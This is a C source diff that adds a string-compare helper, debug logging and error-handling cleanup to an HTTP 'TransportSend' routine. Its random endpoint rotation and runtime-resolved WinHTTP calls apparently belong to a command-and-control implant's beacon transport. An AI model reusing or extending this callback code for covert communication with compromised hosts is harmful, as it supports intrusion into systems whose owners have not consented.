@@ -195,6 +195,17 @@ BOOL TransportInit( PPACKAGE Package )
     return Success;
 }
 
+INT StringCompareW( _In_ LPCWSTR String1, _In_ LPCWSTR String2 )
+{
+    for (; *String1 == *String2; String1++, String2++)
+    {
+        if (*String1 == '\0')
+            return 0;
+    }
+
+    return ((*(LPCWSTR)String1 < *(LPCWSTR)String2) ? -1 : +1);
+}
+
 BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
 {
 #ifdef TRANSPORT_HTTP
@@ -226,6 +237,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     if ( ! hSession )
     {
         PRINTF( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
+
         Successful = FALSE;
         goto LEAVE;
     }
@@ -234,6 +246,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     if ( ! hConnect )
     {
         PRINTF( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
+
         Successful = FALSE;
         goto LEAVE;
     }
@@ -242,8 +255,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     {
         if ( ! Instance->Config.Transport.Uris[ UrisCounter ] )
             break;
-
-        UrisCounter++;
+        else
+            UrisCounter++;
     }
 
     HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % UrisCounter ];
@@ -252,11 +265,14 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     if ( Instance->Config.Transport.Secure )
         HttpFlags |= WINHTTP_FLAG_SECURE;
 
+    // PRINTF( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %d )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags )
     hRequest = Instance->Win32.WinHttpOpenRequest( hConnect, Instance->Config.Transport.Method, HttpEndpoint, NULL, NULL, NULL, HttpFlags );
     if ( ! hRequest )
     {
         PRINTF( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
-        return FALSE;
+
+        Successful = FALSE;
+        goto LEAVE;
     }
 
     if ( Instance->Config.Transport.Secure )
@@ -352,6 +368,8 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     {
         if ( NtGetLastError() == 12029 ) // ERROR_INTERNET_CANNOT_CONNECT
             Instance->Session.Connected = FALSE;
+
+        PRINTF( "HTTP Error: %d\n", NtGetLastError() )
 
         Successful = FALSE;
         goto LEAVE;
